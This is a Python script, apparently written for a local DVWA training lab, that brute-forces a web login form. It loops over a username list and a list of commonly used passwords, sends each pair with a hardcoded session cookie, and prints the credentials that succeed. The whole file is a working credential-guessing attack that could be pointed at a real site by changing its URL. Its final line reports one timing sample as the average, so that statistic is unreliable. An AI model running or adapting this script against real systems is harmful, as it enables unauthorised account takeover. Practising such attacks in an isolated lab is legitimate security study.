import requests
import csv
import time
import sys
import numpy as np

def Obtener_URL(Username, Password):
    return f"http://127.0.0.1:4280/vulnerabilities/brute/?username={Username}&password={Password}&Login=Login"

session = requests.Session()
Headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
COOKIES = {"PHPSESSID": "07d6df1b02ed3efa7f82b5d410dfccae","security": "low"}

tiempos = []
intentos = 0
encontrados = {}

with open("/home/doshuertos/Descargas/2024-197_most_used_passwords.txt", newline="", encoding="utf-8") as file:
    claves = [fila[0].strip() for fila in csv.reader(file) if fila and fila[0].strip()]

with open("/home/doshuertos/Descargas/Usuarios.txt", newline="", encoding="utf-8") as file2:
    Usuarios = [fila[0].strip() for fila in csv.reader(file2) if fila and fila[0].strip()]
    for Usuario in Usuarios:
        for clave in claves:
            T_Inicio = time.time()
            try:
                Respuesta = session.post(Obtener_URL(Usuario,clave),headers=Headers,cookies=COOKIES)
            except requests.RequestException as e:

                print(f"[ERROR] {Usuario}:{clave} -> {e}")
                continue
            if "Welcome to the password protected area" in str(Respuesta.content) :
                print(f"Usuario y contraseña valida :{Usuario}, {clave}")
                encontrados[Usuario] = clave
            else :
                print(f"Usuario y contraseña Incorrecta:{Usuario}, {clave}")
            T_Termino = time.time()
            tiempos.append(T_Termino - T_Inicio)
            intentos += 1
print(f"============================= DATOS =================================")
print(f"Intentos realizados: {intentos}")
for Usuario in encontrados :
     print(f"Usuario y contraseña valida :{Usuario}, {encontrados[Usuario]}")
print(f"El tiempo promedio por cada clave fue :{tiempos[1]}")

